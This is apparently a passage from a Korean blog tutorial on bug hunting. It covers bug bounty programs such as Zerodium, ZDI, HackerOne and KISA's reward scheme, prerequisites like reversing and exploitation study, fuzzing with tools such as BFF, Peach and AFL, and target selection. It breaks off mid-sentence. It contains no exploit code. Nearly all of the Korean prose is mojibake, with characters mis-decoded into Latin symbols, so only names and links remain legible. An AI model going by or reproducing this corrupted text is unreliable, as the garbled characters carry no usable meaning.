ì•„ì´ë””ì–´ ìˆìœ¼ì‹  ë¶„ì€ ëŒ“ê¸€ì„ ë‹¬ì•„ì£¼ì‹œë©´ ê°ì‚¬í•˜ê² ìŠµë‹ˆë‹¤.</li><li>ì´ ê¸€ì˜ íë¦„ì€ ì œ ì˜ì‹ì˜ íë¦„ê³¼ ê°™ìŠµë‹ˆë‹¤. ì¤‘ê°„ì— ì´ì•¼ê¸°ê°€ ë”´ ë°ë¡œ ìƒˆê±°ë‚˜ ì˜¤íƒ€ê°€ ìˆê±°ë‚˜ ì•„ë‹ˆë©´ ê°œì†Œë¦¬ë¥¼ í•˜ê±°ë‚˜â€¦.</li><li>ìµœëŒ€í•œ ì œê°€ í–ˆë˜ ë°©ë²•ë“¤ì„ ëª¨ë‘ ì¨ë‚¼ ê²ƒì´ê¸° ë•Œë¬¸ì— ì‹¤íŒ¨í•˜ëŠ” ê³¼ì •ë„ ì“¸ ìƒê°ì…ë‹ˆë‹¤. ê·¸ë ‡ê¸° ë•Œë¬¸ì— ì²˜ìŒ ë³¼ ë•Œë¶€í„° ì§ì ‘ í•˜ë©´ì„œ ë”°ë¼ê°€ê¸°ë³´ë‹¤ëŠ” í•œ ë²ˆ ì“± ë³´ê³  ë”°ë¼ í•´ ë³´ì‹œëŠ” ê±¸ ì¶”ì²œë“œë¦½ë‹ˆë‹¤</li><li>ì œê°€ ë¬¸ê³¼ë„ ì•„ë‹ˆê±°ë‹ˆì™€ í•™ì°½ ì‹œì ˆì˜ ì ˆë°˜ ì´ìƒì„ ì¤‘ê¶ˆì—ì„œ ë³´ëƒˆê¸° ë•Œë¬¸ì— í•œì¿¸ë§ì´ ìµ¸ê¸ˆ ë¶€ì¡±í•©ë‹ˆë°ìŠ¤.</li></ol><p>ë­ ì•”íŠ¼ ì‹œì‘í•˜ê² ìŠµë‹ˆë‹¹ ã…‹ã…‹</p><h1 id="ëª©ì°¨"><a href="#ëª©ì°¨" class="headerlink" title="ëª©ì°¨"></a>ëª©ì°¨</h1><h3 id="part-1"><a href="#part-1" class="headerlink" title="part 1"></a>part 1</h3><ol><li>ë²„ê·¸í—ŒíŒ…ì´ë€?</li><li>ë²„ê·¸ ë°”ìš´í‹°</li><li>ì·¨ì•½ì ì„ ì°¾ê¸° ì „ì—</li><li>ì·¨ì•½ì ì„ ì°¾ëŠ” ë°©ë²•</li><li>íƒ€ê¹ƒ ì„ ì •</li><li>ì‹œë“œ íŒŒì¼</li></ol><h3 id="To-be-Continuedâ€¦"><a href="#To-be-Continuedâ€¦" class="headerlink" title="To be Continuedâ€¦"></a>To be Continuedâ€¦</h3><ol><li>ë²„ê·¸ ë°”ìš´í‹° - KMPlayer</li><li>From Crash to Exploit</li><li>ì¡ë‹´</li></ol><h1 id="ë²„ê·¸í—ŒíŒ…ì´ë€"><a href="#ë²„ê·¸í—ŒíŒ…ì´ë€" class="headerlink" title="ë²„ê·¸í—ŒíŒ…ì´ë€?"></a>ë²„ê·¸í—ŒíŒ…ì´ë€?</h1><p>ì†Œí”„íŠ¸ì›¨ì–´ë‚˜ ì›¹ ì„œë¹„ìŠ¤ ë“±ì˜ ì·¨ì•½ì ì„ ì œë³´í•´ ê¸ˆì „ì ì¸ ë³´ìƒ, í•´ì»¤ì˜ ëª…ì˜ˆ íšë“ ë“± ì´ë“ì„ ë…¸ë¦¬ëŠ” ì¼ë ¨ì˜ í–‰ìœ„ì…ë‹ˆë‹¤. ë­ ê·¸ëŸ¬ë‹ˆê¹Œ ê²°êµ­ ì·¨ì•½ì ì„ ì‹ ë‚˜ê²Œ ì°¾ê³  ëˆë„ ë°›ê³  í¬ë˜ë”§ë„ ë°›ê³  ã„±ã…‡ã„·</p><p>êµ­ë‚´ì˜ ê²½ìš° ì£¼ì˜í•´ì•¼ í•  ì ì€ ì„œë¹„ìŠ¤ ì¤‘ì¸ ì›¹ ì‚¬ì´íŠ¸ í˜¹ì€ ì„œë²„ì— ëŒ€í•œ ê³µê²©ì€ ë¶ˆë²•ì´ë¯€ë¡œ ì›¹ ë²„ê·¸í—ŒíŒ…ì€ ì¢€ í˜ë“¤ê² ë„¤ìš” ã… ã…  í•˜ì§€ë§Œ ì œê°€ ì•Œê¸°ë¡œëŠ” ë„¤ì´ë²„ëŠ” ê°€ëŠ¥í•œ ê±¸ë¡œ ì•Œê³  ìˆìŠµë‹ˆë‹¤.</p><h1 id="ë²„ê·¸-ë°”ìš´í‹°"><a href="#ë²„ê·¸-ë°”ìš´í‹°" class="headerlink" title="ë²„ê·¸ ë°”ìš´í‹°"></a>ë²„ê·¸ ë°”ìš´í‹°</h1><p>í•´ì»¤ë“¤ì´ ì œë³´í•œ ì·¨ì•½ì ì— ëŒ€í•œ ë³´ìƒì„ í•´ì£¼ëŠ” ì œë„ì…ë‹ˆë‹¤.</p><h2 id="1-ê°-íšŒì‚¬ë³„-ë²„ê·¸-ë°”ìš´í‹°"><a href="#1-ê°-íšŒì‚¬ë³„-ë²„ê·¸-ë°”ìš´í‹°" class="headerlink" title="1) ê° íšŒì‚¬ë³„ ë²„ê·¸ ë°”ìš´í‹°"></a>1) ê° íšŒì‚¬ë³„ ë²„ê·¸ ë°”ìš´í‹°</h2><p>ì™¸êµ­ ê°™ì€ ê²½ìš°ì—ëŠ” ê° íšŒì‚¬(ë‹¤ëŠ” ì•„ë‹ˆì§€ë§Œ)ë§ˆë‹¤ ë²„ê·¸ ë°”ìš´í‹°ë¥¼ ìš´ì˜í•˜ê³  ìˆìŠµë‹ˆë‹¤. ë‹¤ë“¤ ì˜ ì•„ì‹œê² ì§€ë§Œ ëŒ€í‘œì ìœ¼ë¡œ êµ¬ê¸€, í˜ì´ìŠ¤ë¶, ì• í”Œ ë“±ë“± ì›¬ë§Œí•œ ì•„ëŠ” ê¸°ì—…ë“¤ì€ ë‹¤ ë²„ê·¸ ë°”ìš´í‹°ë¥¼ ìš´ì˜í•˜ê³  ìˆìŠµë‹ˆë‹¤. ë¬¼ë¡  ìì‚¬ì˜ í”„ë¡œê·¸ë¨ì˜ ëŒ€í•´ì„œë§Œ ìš´ì˜í•˜ê³  ìˆì£ . í•˜ì§€ë§Œ ê°ì ìš´ì˜ ë£°ì€ ì¡°ê¸ˆì”© ë‹¤ë¦…ë‹ˆë‹¤.</p><p>ì˜ˆë¥¼ ë“¤ì–´ ì–´ë””ëŠ” ìì‚¬ í”„ë¡œê·¸ë¨ì˜ í¬ë˜ì‹œë§Œ ë°›ëŠ” ê³³ë„ ìˆì§€ë§Œ ì–´ë””ëŠ” í’€ ìµìŠ¤ê¹Œì§€ ìˆì–´ì•¼ì§€ë§Œ ë³´ìƒì„ í•´ì£¼ëŠ”â€¦ ì•„ë‹ˆë©´ í¬ë˜ë”§ë§Œ ì£¼ê³  ë¦¬ì›Œë“œëŠ” ì—†ëŠ”â€¦. ë­ ê·¸ëŸ° ê±°ëŠ” ê° íšŒì‚¬ì˜ í™ˆí˜ì´ì§€ì—ì„œ í™•ì¸ì„ í•˜ì‹œë©´ ë©ë‹ˆë‹¤.</p><p><a href="https://www.bugcrowd.com/bug-bounty-list/">https://www.bugcrowd.com/bug-bounty-list/</a></p><p>ìœ„ ë§í¬ë¥¼ ë“¤ì–´ê°€ì‹œë©´ ë²„ê·¸ ë°”ìš´í‹°ë¥¼ ìš´ì˜í•˜ê³  ìˆëŠ” íšŒì‚¬ë“¤ì˜ ë¦¬ìŠ¤íŠ¸ì™€ ìš´ì˜ ë°©ì‹ì´ ê°„ë‹¨í•˜ê²Œ ì •ë¦¬ë˜ì–´ ìˆìŠµë‹ˆë‹¤. ê´€ì‹¬ ìˆìœ¼ì‹  ë¶„ë“¤ì€ ì°¸ê³ í•˜ì‹œë©´ ë  ê±° ê°™ì•„ìš”.</p><h2 id="2-ì œë¡œë””ì›€-ZDI-í•´ì»¤ì›-ë“±"><a href="#2-ì œë¡œë””ì›€-ZDI-í•´ì»¤ì›-ë“±" class="headerlink" title="2) ì œë¡œë””ì›€, ZDI, í•´ì»¤ì› ë“±"></a>2) ì œë¡œë””ì›€, ZDI, í•´ì»¤ì› ë“±</h2><p>íƒ€ íšŒì‚¬ì˜ ì·¨ì•½ì ë„ ì œë³´ë°›ëŠ” ë²„ê·¸ ë°”ìš´í‹°ì…ë‹ˆë‹¤. ë³´ìƒì´ ìŒ˜ ê±¸ë¡œ ìœ ëª…í•˜ì£ . ì œë¡œë””ì›€ì˜ ë³´ìƒê¸ˆì•¡ì„ í•œë²ˆ ë³¼ê¹Œìš”?</p><p><img src="/2021/03/07/l0ch/bughunting-tutorial/image1.png"></p><blockquote><p>ì¶œì²˜ : ì œë¡œë””ì›€</p></blockquote><p>ê·¸ëƒ¥ ë´ë„ ìƒë‹¹íˆ ì„¸ì£ ?? ã…ã„·ã„·</p><p>ê¸°ë³¸ì ìœ¼ë¡œ $10,000 ë©´ ì§€ê¸ˆ í™˜ìœ¨ë¡œ ê³„ì‚°í•´ë³´ë©´ ì²œë§Œ ì›ì´ ë„˜ë„¤ìš”;;; í•˜ì§€ë§Œ ê·¸ë§Œí¼ ì‰¬ìš´ íƒ€ê¹ƒì€ í•˜ë‚˜ë„ ì—†ë„¤ìš” ã… ã…  ê·¸ë¦¬ê³  ê¸°ë³¸ì ìœ¼ë¡œ ë‹¤ë“¤ í’€ ìµìŠ¤ë¥¼ í•´ì„œ ë³´ë‚´ì•¼ í•˜ê¸° ë•Œë¬¸ì— ë”ë”ìš± í˜ë“­ë‹ˆë‹¤.</p><p>í•´ì»¤ì› ê°™ì€ ê²½ìš°ëŠ” ì œë¡œë””ì›€ê³¼ ZDI ì™€ëŠ” ë‹¤ë¥´ê²Œ ì›¹ ì„œë¹„ìŠ¤ì— ëŒ€í•´ì„œë§Œ ë²„ê·¸ ë°”ìš´í‹°ë¥¼ ì§„í–‰í•˜ê³  ìˆìŠµë‹ˆë‹¤. êµ­ë‚´ì—ì„œ ì›¹ ë²„ê·¸ ë°”ìš´í‹°ë¥¼ ëª»í•´ì„œ ì•„ì‰¬ìš´ ë¶„ë“¤ì€ í•´ì»¤ì› ë²„ê·¸ ë°”ìš´í‹°ë¥¼ ì‹œë„í•´ë³´ëŠ” ê²ƒì´ ì¢‹ì„ ë“¯í•©ë‹ˆë‹¤ ã…ã…</p><h2 id="3-KISA-S-W-ì‹ ê·œ-ì·¨ì•½ì -í¬ìƒ-ì‹ ê³ ì œ"><a href="#3-KISA-S-W-ì‹ ê·œ-ì·¨ì•½ì -í¬ìƒ-ì‹ ê³ ì œ" class="headerlink" title="3) KISA S/W ì‹ ê·œ ì·¨ì•½ì  í¬ìƒ ì‹ ê³ ì œ"></a>3) KISA S/W ì‹ ê·œ ì·¨ì•½ì  í¬ìƒ ì‹ ê³ ì œ</h2><p>ì „ ì„¸ê³„ì ìœ¼ë¡œ ìœ ì¼í•˜ê²Œ êµ­ê°€ê¸°ê´€ì´ ìš´ì˜í•˜ê³  ìˆëŠ” ë²„ê·¸ ë°”ìš´í‹° í”„ë¡œê·¸ë¨ì…ë‹ˆë‹¤.(ë¼ê³  ë°œí‘œì—ì„œ ë“¤ì—ˆë˜ ê²Œ ìƒê°ì´ ë‚˜ë„¤ìš”) ê·¸ë¦¬ê³  êµ­ë‚´ì—ì„œ ëª‡ ì—†ëŠ” ë²„ê·¸ ë°”ìš´í‹° ì¤‘ í•˜ë‚˜ì´ê¸°ë„ í•˜ì£  ã…‹ã…‹</p><p>í‚¤ì‚¬ë¥¼ ì œì™¸í•˜ê³  ì‚¼ì„±ì´ë‚˜ ë‹¤ë¥¸ ëª‡ëª‡ íšŒì‚¬ì—ì„œë„ ë²„ê·¸ ë°”ìš´í‹°ë¥¼ ìš´ì˜í•˜ê³  ìˆì§€ë§Œ ëŒ€ìƒì´ ì œí•œì ì¸ ê±¸ë¡œ ê¸°ì–µí•©ë‹ˆë‹¤. ì €ëŠ” ê°œì¸ì ìœ¼ë¡œ í‚¤ì‚¬ì—ì„œ ìš´ì˜í•˜ëŠ” ë²„ê·¸ ë°”ìš´í‹°ê°€ ì œì¼ ê´œì°®ì€ ê±° ê°™ë„¤ìš”.(ì• ìš©í•˜ê³  ìˆìŠµë‹ˆë‹¤ ã…ã… ë§ì´ ì œë³´í•˜ì§€ëŠ” ì•Šì•˜ì§€ë§Œâ€¦)</p><p><a href="https://www.krcert.or.kr/consult/software/vulnerability.do?orgSiteUrl=https://www.krcert.or.kr">https://www.krcert.or.kr/consult/software/vulnerability.do?orgSiteUrl=https://www.krcert.or.kr</a></p><p>ìœ„ ë§í¬ì— ë“¤ì–´ê°€ì„œ ì‹ ê³ ì„œ ì–‘ì‹ì„ ë‹¤ìš´ë¡œë“œí•´ ì–‘ì‹ëŒ€ë¡œ ì‘ì„±í•˜ê³  ì œë³´í•˜ì‹œë©´ ë©ë‹ˆë‹¤. ì‰½ì£ ?</p><p>2016ë…„ì—ëŠ” eipë§Œ ë°”ê¿”ì„œ ì œë³´ë¥¼ í•´ë„ í¬ìƒì„ ì¤¬ë˜ ê±° ê°™ì€ë° ìµœê·¼ì—ëŠ” ê¼­ í’€ ìµìŠ¤ë¥¼ í•´ì•¼ì§€ë§Œ í¬ìƒì„ ì¤€ë‹¤ê³  í•˜ë„¤ìš” ã… ã… </p><h1 id="ì·¨ì•½ì ì„-ì°¾ê¸°-ì „ì—"><a href="#ì·¨ì•½ì ì„-ì°¾ê¸°-ì „ì—" class="headerlink" title="ì·¨ì•½ì ì„ ì°¾ê¸° ì „ì—"></a>ì·¨ì•½ì ì„ ì°¾ê¸° ì „ì—</h1><p>ì·¨ì•½ì ì„ ì°¾ê¸° ì „ì— ë¨¼ì € ì•Œì•„ë‘¬ì•¼ í•  ê²ƒë“¤ì— ëŒ€í•´ì„œ ë¨¼ì € ì–˜ê¸°í•´ë³¼ê²Œìš”</p><ol><li>ëª¨ë“  ì·¨ì•½ì ì€ untrust inputìœ¼ë¡œë¶€í„° ë°œìƒí•©ë‹ˆë‹¤. ë¬´ìŠ¨ ì·¨ì•½ì ì´ë“  ê°„ì— ì‚¬ìš©ìê°€ ì»¨íŠ¸ë¡¤í•  ìˆ˜ ìˆê³  í”„ë¡œê·¸ë¨ì— ì „ë‹¬ë˜ëŠ” ë°ì´í„°ì˜ ì¡°ì‘ì— ì˜í•´ì„œ ë²„ê·¸ê°€ ë°œìƒí•©ë‹ˆë‹¤.</li><li>ëª¨ë“  ë²„ê·¸ê°€ ìµìŠ¤ ê°€ëŠ¥í•œ ê²ƒì´ ì•„ë‹™ë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´ ì˜¤ë²„í”Œë¡œìš°ê°€ ë°œìƒí–ˆì–´ë„ ë¯¸í‹°ê²Œì´ì…˜ ë•Œë¬¸ì— ìµìŠ¤ë¥¼ ëª» í•  ìˆ˜ë„ ìˆê³  ì•„ë‹ˆë©´ eip ì»¨íŠ¸ë¡¤í•  ìˆ˜ ìˆëŠ” ë¶€ë¶„ì´ ì—†ì–´ì„œ ìµìŠ¤ë¥¼ ëª»í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤. â†’ ì‹¤ì œ ê²½í—˜ì„. ì˜¤ë²„ í”Œë¡œìš° í–ˆëŠ”ë° ìµìŠ¤ ëª»í•¨â€¦(ì‚¬ì‹¤ ë” ë³´ê¸° ê·€ì°®ì•„ì„œ ì•ˆ ë´„)</li><li>ë‚¨ì´ ì´ë¯¸ ì°¾ì•„ì„œ ì œë³´ë¥¼ í–ˆì„ ìˆ˜ë„ ìˆê¸° ë•Œë¬¸ì— ì—…ë°ì´íŠ¸ê°€ ë‚˜ì˜¤ë©´ ë°”ë¡œë°”ë¡œ í™•ì¸í•´ì•¼ í•©ë‹ˆë‹¤. ìµìŠ¤í•˜ê³  ìˆëŠ”ë° ë‹¤ë¥¸ ì‚¬ëŒì´ ë¨¼ì € ì œë³´í•´ì„œ ì—…ë°ì´íŠ¸í•œ ê±¸ ëª¨ë¥´ê³  ìˆë‹¤ê°€ ì‹œê°„ë§Œ ë‚ ë¦¬ë©´ ì–µìš¸í•˜ìë‚˜ìš” ã… ã…  (ìê¸° êº¼ëŠ” íŒ¨ì¹˜ ì•ˆë  ê±°ë¼ ìƒê°í•˜ì§€ ë§ˆì„¸ìš”â€¦ íŒ¨ì¹˜ë‹¹í•˜ë©´ ì‚¶ì˜ ì˜ìš•ì´ ì‚¬ë¼ì§‘ë‹ˆë‹¤â€¦ ã… ã… )</li><li>êµ­ë‚´ í”„ë¡œê·¸ë¨ì—ëŠ” ì™¸êµ­ ìœ ëª… í”„ë¡œê·¸ë¨ë³´ë‹¤ëŠ” ì·¨ì•½ì ì´ ë§ì€ í¸ì…ë‹ˆë‹¤.(ì•„ ë¬¼ë¡  ì§„ì§œ ë³´ì•ˆì— ì‹ ê²½ ì“´ í”„ë¡œê·¸ë¨ì„ ì œì™¸í•˜ê³ ìš”. í•œê¸€ ê°™ì´â€¦.? ã… ã…  ë³´ì•ˆëª¨ë“ˆ ì˜¬ë¼ê°€ê³  ë‚˜ì„œëŠ” ìµìŠ¤ í•˜ê¸° í˜ë“¤ë‹¤ê³  í•˜ë„¤ìš”) ì·¨ì•½ì ì„ ì°¾ì„ ë•Œ ê°€ì¥ ë¶ˆì•ˆí•œ ê²ƒì´ â€œì·¨ì•½ì ì´ ì—†ìœ¼ë©´ ì–´ì©Œì§€?â€ì¸ë° ë³´í†µ í”„ë¡œê·¸ë¨ë“¤ì´ ì˜›ë‚  ëª¨ë“ˆì„ ì“°ê±°ë‚˜ ì²˜ìŒ ì„¤ê³„í•  ë•Œ ë³´ì•ˆì— ì‹ ê²½ ì“°ì§€ ì•Šì€ í”„ë¡œê·¸ë¨ë“¤ì´ ìˆì–´ì„œ ì·¨ì•½ì ì„ ì°¾ê¸°ì—ëŠ” ì–´ë µì§€ ì•ŠìŠµë‹ˆë‹¤. (ì•„ë§ˆë„â€¦?)</li></ol><p>ê·¸ëŸ¼ ì·¨ì•½ì ì„ ì°¾ê¸° ìœ„í•´ì„œëŠ” ë¬´ì—‡ì´ í•„ìš”í• ê¹Œìš”?</p><ol><li>ë¦¬ë²„ì‹± : ì·¨ì•½ì ì´ ì–´ë”” ìˆëŠ”ì§€ ê·¸ë¦¬ê³  í”„ë¡œê·¸ë¨ì´ ì–´ë–»ê²Œ ëŒì•„ê°€ëŠ”ì§€ í™•ì¸í•˜ê¸° ìœ„í•´ì„œëŠ” ë¦¬ë²„ì‹±ì— ìµìˆ™í•´ì ¸ ìˆì–´ì•¼ í•©ë‹ˆë‹¤. ë¦¬ë²„ì‹±ì„ ì˜í• ìˆ˜ë¡ ì·¨ì•½ì ì„ ë” ë¹ ë¥´ê²Œ ì°¾ê² ì£ .</li><li>ìµìŠ¤í”Œë¡œì‡ : ì´ê±°ëŠ” ì·¨ì•½ì ì„ ì°¾ê³  eipë¥¼ ì¡ê³  ë‚˜ì„œì˜ ë¬¸ì œì¸ë° ì‚¬ì‹¤ êµ­ë‚´ í”„ë¡œê·¸ë¨ì„ ìµìŠ¤ í•  ë•Œì—ëŠ” corelanì˜ <a href="https://www.corelan.be/index.php/category/security/exploit-writing-tutorials/">windows exploitation tutorial</a>ë§Œ ì½ì–´ë„ ì¶©ë¶„í•©ë‹ˆë‹¤.(ëŒ€ë¶€ë¶„ì€? ì €ë„ ëª¨ë“  í”„ë¡œê·¸ë¨ì„ í•´ë³¸ ê²Œ ì•„ë‹ˆë¼ ì¥ë‹´ì€ ëª»í•˜ê² ë„¤ìš”)</li><li>ê°œë°œ ëŠ¥ë ¥ : ê°€ì¥ ì¤‘ìš”í•˜ë‹¤ê³  ìƒê°í•˜ëŠ” ë¶€ë¶„ì…ë‹ˆë‹¤. ê°œë°œ ëŠ¥ë ¥ì´ ìˆìœ¼ë©´ ë¦¬ë²„ì‹±í•˜ëŠ” ë°ì—ë„ ë„ì›€ì´ ë˜ê³  í”„ë¡œê·¸ë¨ êµ¬ì¡°ë¥¼ ì¢€ ë” ì •í™•íˆ ë¹¨ë¦¬ íŒŒì•…í•  ìˆ˜ ìˆë‹¤ê³  í•˜ë„¤ìš”. ì €ëŠ” ê°œë°œì„ ëª»í•´ì„œ ì´ë ‡ê²Œ í•´í‚¹ì„ ëª»í•˜ë‚˜ ë´…ë‹ˆë‹¤ ã…œã…  ê°œë°œì€ ë˜ ì–¸ì œ ê³µë¶€í•˜ì§€â€¦</li></ol><h1 id="ì·¨ì•½ì ì„-ì°¾ëŠ”-ë°©ë²•"><a href="#ì·¨ì•½ì ì„-ì°¾ëŠ”-ë°©ë²•" class="headerlink" title="ì·¨ì•½ì ì„ ì°¾ëŠ” ë°©ë²•"></a>ì·¨ì•½ì ì„ ì°¾ëŠ” ë°©ë²•</h1><p>ì·¨ì•½ì ì„ ì°¾ëŠ” ë°©ë²•ì€ ì—¬ëŸ¬ ê°€ì§€ê°€ ìˆìŠµë‹ˆë‹¤.</p><ol><li>ì†ŒìŠ¤ì½”ë“œ ì˜¤ë””íŒ…</li><li>ì† í¼ì§•</li><li>í¼ì§•</li></ol><p>ì¼ë‹¨ ì†ŒìŠ¤ì½”ë“œ ì˜¤ë””íŒ…ì˜ ê²½ìš° ì†ŒìŠ¤ì½”ë“œê°€ ìˆì–´ì•¼ê² ì£ ?? ì†ŒìŠ¤ì½”ë“œë¥¼ ë³´ë©´ì„œ ë¶„ì„í•˜ê³  ì·¨ì•½ì ì„ íƒìƒ‰í•˜ëŠ” ë°©ë²•ì„ ë§í•©ë‹ˆë‹¤. êµ­ë‚´ í”„ë¡œê·¸ë¨ì—ëŠ” ê±°ì˜ ì‚¬ìš©í•˜ì§€ ëª»í•˜ëŠ” ë°©ë²•ì´ë„¤ìš” ã… ã…  ìŒ í—¥ìŠ¤ë ˆì´ ë³´ë©´ì„œ í•˜ëŠ” ê²ƒë„ í•´ë‹¹ ì‚¬í•­ì´ ë˜ë ¤ë‚˜ìš”? ë­ ê·¸ëƒ¥ ì½”ë“œë¥¼ ë³´ê³  ë¶„ì„í•˜ëŠ” ê²ƒì„ ë‘ë£¨ë‘ë£¨ ë§í•˜ëŠ” ê±°ë¼ê³  ë³´ë©´ ë˜ê² ë„¤ìš”.</p><p>ì†í¼ì§• ê°™ì€ ê²½ìš° ì œê°€ ì²˜ìŒ ë²„ê·¸í—ŒíŒ…ì„ í•˜ë©´ì„œ ë§ì´ ì‚¬ìš©í–ˆë˜ ë°©ë²•ì¸ë°ìš”. ê·¸ëƒ¥ ë…¸ê°€ë‹¤ì…ë‹ˆë‹¤. Untrust inputì„ ì§ì ‘ ì†ìœ¼ë¡œ ë„£ê±°ë‚˜ ìˆ˜ì •í•´ê°€ë©´ì„œ í…ŒìŠ¤íŠ¸í•˜ëŠ” ë°©ë²•ì…ë‹ˆë‹¤.</p><p>Untrust input ì´ íŒŒì¼ì¼ ë•Œ íŒŒì¼ í¬ë§·ì— ëŒ€í•´ì„œ ì•Œì•„ê°€ë©´ì„œ ì§ì ‘ ìˆ˜ì •í•´ê°€ë©´ì„œ í…ŒìŠ¤íŠ¸ë¥¼ í•´ë³´ë©´ ë­”ê°€ ì´ ìœ„ì¹˜ëŠ” ë¬´ìŠ¨ ì—­í• ì´ë¼ëŠ” ëŠë‚Œì´ ì¢€ ì˜µë‹ˆë‹¤. (ì•„ë§ˆ? ë””ë²„ê¹…ë„ ê°™ì´ í•˜ë©´ì„œ ì¢€ ë§ì´ ì‚½ì§ˆí•´ì•¼ í•˜ê¸´ í•˜ì§€ë§Œ). ë¬¼ë¡  ì´ê²ƒë„ íŒŒì¼ í¬ë§·ì´ ë‹¨ìˆœí•  ê²½ìš°ì´ê¸°ëŠ” í•˜ì§€ë§Œìš”. ì˜ˆë¥¼ ë“¤ì–´ì„œ ë¬¸ì„œ í¬ë§·ì¸ ê²½ìš°ì— íŒŒì¼ì— ë¬¸ìì—´ì´ ì¡´ì¬í•˜ê³  ì•ì— ìˆ«ìê°€ ìˆìœ¼ë©´ ì´ê²Œ ëŒ€ì¶© ë’¤ì— ìˆëŠ” ë¬¸ìì—´ì˜ í°íŠ¸ ì •ë³´ì´ê±°ë‚˜ ë¬¸ìì—´ì˜ ê¸¸ì´ë¼ëŠ” ê²ƒì„ ë°”ë¡œ ë³´ê³  ì•Œê±°ë‚˜ ëª‡ ë²ˆì˜ í…ŒìŠ¤íŠ¸ë¥¼ í†µí•´ì„œ ì•Œ ìˆ˜ ìˆì£ . ì´ë ‡ê²Œ í•˜ë‚˜í•˜ë‚˜ ì‚½ì§ˆì„ í•´ê°€ë©´ì„œ íŒŒì¼ í¬ë§·ì— ëŒ€í•œ ì´í•´ë¥¼ ë†’ì¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>ì²˜ìŒì—ëŠ” ìê¸°ê°€ íŒŒì¼ì— ëŒ€í•œ ì¶”ì¸¡ì„ í•  ìˆ˜ ìˆê³  ì¸í’‹ì„ ì •í™•í•˜ê²Œ ì•Œê³  ìˆê¸° ë•Œë¬¸ì— ë””ë²„ê¹…í•˜ê¸°ì—ëŠ” ë¹„êµì  í¸í•˜ë‹¤ëŠ” ì¥ì ì´ ìˆìŠµë‹ˆë‹¤. í•˜ì§€ë§Œ ì§ì ‘ ì¡°ì‘ì„ í•´ì•¼ í•˜ê¸° ë•Œë¬¸ì— ì‹œê°„ì´ ë§ì´ ë“¤ê³  ëª¨ë“  í¬ë§·ì„ ì•Œ ìˆ˜ ìˆëŠ” ê²ƒë„ ì•„ë‹™ë‹ˆë‹¤. íŠ¹íˆ íŒŒì¼ì´ ì••ì¶•ë˜ì–´ ìˆëŠ” ìƒíƒœë¼ë©´ ë”ë”ìš± ì´ê²Œ ë­˜ í•˜ëŠ”ì§€ ì•Œ ìˆ˜ê°€ ì—†ìŠµë‹ˆë‹¤. ì‚¬ì‹¤ ìŠ¤í¬ë¦½íŠ¸ í¼ì§• í•  ë•Œ ë” ë§ì´ ì“°ëŠ” ë°©ë²•ì…ë‹ˆë‹¤ ã…‹ã…‹ã…‹</p><p>ë”°ë¼ì„œ ì–´ì°¨í”¼ ê·¸ëƒ¥ ë®¤í…Œì´ì…˜ì„ í• ê±° ë³´í†µ í¼ì €ë¥¼ ì‚¬ìš©í•´ì„œ í¼ì§•ì„ í•©ë‹ˆë‹¤. í¼ì €ì—ì„œëŠ” ì£¼ì–´ì§„ ì‹œë“œ íŒŒì¼ì„ ì„ì˜ë¡œ ì¡°ì‘í•˜ì—¬ í…ŒìŠ¤íŠ¸ë¥¼ ì§„í–‰í•´ì¤ë‹ˆë‹¤. ê·¸ë¦¬ê³  í¬ë˜ì‹œê°€ ë°œìƒí•˜ë©´ ì›ë³¸ íŒŒì¼ê³¼ í¬ë˜ì‹œ íŒŒì¼ ê·¸ë¦¬ê³  í¬ë˜ì‹œ ì •ë³´ë¥¼ ì €ì¥í•˜ì£ . ì €ë„ í¼ì§•ì„ ë§ì´ ì‚¬ìš©í•˜ê³  ìˆìŠµë‹ˆë‹¤.</p><p>í¼ì €ë¥¼ ì§ì ‘ ì§œë„ ë˜ì§€ë§Œ ê³µê°œëœ ë¬´ë£Œ í¼ì €ê°€ ë§ìŠµë‹ˆë‹¤!!! ã…ã… ê°œì´ë“ BFF, Peach, AFL ë˜ ê·¸ë¦¬ê³ â€¦ ë­ ìˆì—ˆë”ë¼â€¦ ã…‹ã…‹ã…‹ ê¸°ì–µì´ ì˜ ì•ˆ ë‚˜ëŠ”ë° ë­ ì•”íŠ¼ ã…‹ã…‹ã…‹ã…‹ ì €ëŠ” BFFë¥¼ ìì£¼ ì‚¬ìš©í•©ë‹ˆë‹¤. BFFëŠ” ì•„ë˜ ë§í¬ë¥¼ ë“¤ì–´ê°€ë©´ ë‹¤ìš´ë¡œë“œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p><a href="https://www.cert.org/vulnerability-analysis/tools/bff.cfm">https://www.cert.org/vulnerability-analysis/tools/bff.cfm</a></p><p>ì›ë˜ ì´ë¦„ì€ FOE ì˜€ëŠ”ë° ì—…ë°ì´íŠ¸ë˜ë©´ì„œ BFFë¡œ ì´ë¦„ì´ ë°”ë€Œì—ˆë„¤ìš” ã…‹ã…‹ ì°¸ê³ ë¡œ ë†€ë€ ê²Œ ì›ë˜ FOEê°€ ìœˆë„ìš°ë§Œ ì§€ì›í–ˆì—ˆëŠ”ë° ì—…ë°ì´íŠ¸ë˜ë©´ì„œ ë§¥ì´ë‘ ë¦¬ëˆ…ìŠ¤ë„ ì§€ì›í•˜ê²Œ ëë„¤ìš”!! ê°„ë‹¨í•˜ê²Œ ë§¥ì—ì„œ ëª‡ ê°œ ëŒë ¤ë´¤ëŠ”ë° ë­”ê°€ ë” ë§ì´ í„°ì§€ëŠ” ì´ ëŠë‚Œì ì¸ ëŠë‚Œâ€¦ ë‚˜ì¤‘ì— ë§¥ ì• í”Œë¦¬ì¼€ì´ì…˜ ìµìŠ¤í”Œë¡œì‡ë„ í•´ë´ì•¼ê² ë„¤ìš” ã…‹ã…‹ã…‹</p><p>ì•”íŠ¼ BFF ë“± í¼ì €ì˜ ì‚¬ìš©ë²•ì€ ê°„ë‹¨í•˜ê²Œ ê²€ìƒ‰ë§Œ í•´ë„ ë§ì´ ë‚˜ì˜¤ë‹ˆ ìŠ¤í‚µí•˜ë„ë¡ í•˜ê² ìŠµë‹ˆë‹¤ ã…‹ã…‹</p><h1 id="íƒ€ê¹ƒ-ì„ ì •"><a href="#íƒ€ê¹ƒ-ì„ ì •" class="headerlink" title="íƒ€ê¹ƒ ì„ ì •"></a>íƒ€ê¹ƒ ì„ ì •</h1><p>íƒ€ê¹ƒì„ ì„ ì •í•˜ëŠ” ê±´ ë§¤ìš° ì¤‘ìš”í•©ë‹ˆë‹¤!! ì™œëƒ!!! í¬ìƒ 